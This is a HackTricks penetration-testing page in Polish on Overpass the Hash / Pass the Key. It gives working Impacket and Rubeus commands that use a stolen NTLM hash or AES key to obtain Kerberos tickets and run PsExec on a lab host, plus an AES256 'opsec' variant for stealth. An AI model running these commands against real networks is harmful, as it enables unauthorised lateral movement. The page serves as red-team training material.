# Over Pass the Hash/Pass the Key

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

Atak **Overpass The Hash/Pass The Key (PTK)** jest zaprojektowany dla środowisk, w których tradycyjny protokół NTLM jest ograniczony, a uwierzytelnianie Kerberos ma pierwszeństwo. Atak ten wykorzystuje hash NTLM lub klucze AES użytkownika do pozyskiwania biletów Kerberos, co umożliwia nieautoryzowany dostęp do zasobów w sieci.

Aby przeprowadzić ten atak, pierwszym krokiem jest zdobycie hasha NTLM lub hasła konta docelowego użytkownika. Po zabezpieczeniu tych informacji można uzyskać bilet przyznawania biletów (TGT) dla konta, co pozwala atakującemu uzyskać dostęp do usług lub maszyn, do których użytkownik ma uprawnienia.

Proces można rozpocząć za pomocą następujących poleceń:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Dla scenariuszy wymagających AES256, opcja `-aesKey [AES key]` może być wykorzystana. Ponadto, uzyskany bilet może być użyty z różnymi narzędziami, w tym smbexec.py lub wmiexec.py, poszerzając zakres ataku.

Napotykanie problemów takich jak _PyAsn1Error_ lub _KDC cannot find the name_ jest zazwyczaj rozwiązywane przez aktualizację biblioteki Impacket lub użycie nazwy hosta zamiast adresu IP, zapewniając zgodność z Kerberos KDC.

Alternatywna sekwencja poleceń używająca Rubeus.exe demonstruje inny aspekt tej techniki:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ta metoda odzwierciedla podejście **Pass the Key**, koncentrując się na przejęciu i wykorzystaniu biletu bezpośrednio do celów uwierzytelniania. Ważne jest, aby zauważyć, że inicjacja żądania TGT wyzwala zdarzenie `4768: A Kerberos authentication ticket (TGT) was requested`, co oznacza domyślne użycie RC4-HMAC, chociaż nowoczesne systemy Windows preferują AES256.

Aby dostosować się do bezpieczeństwa operacyjnego i używać AES256, można zastosować następujące polecenie:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## References

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
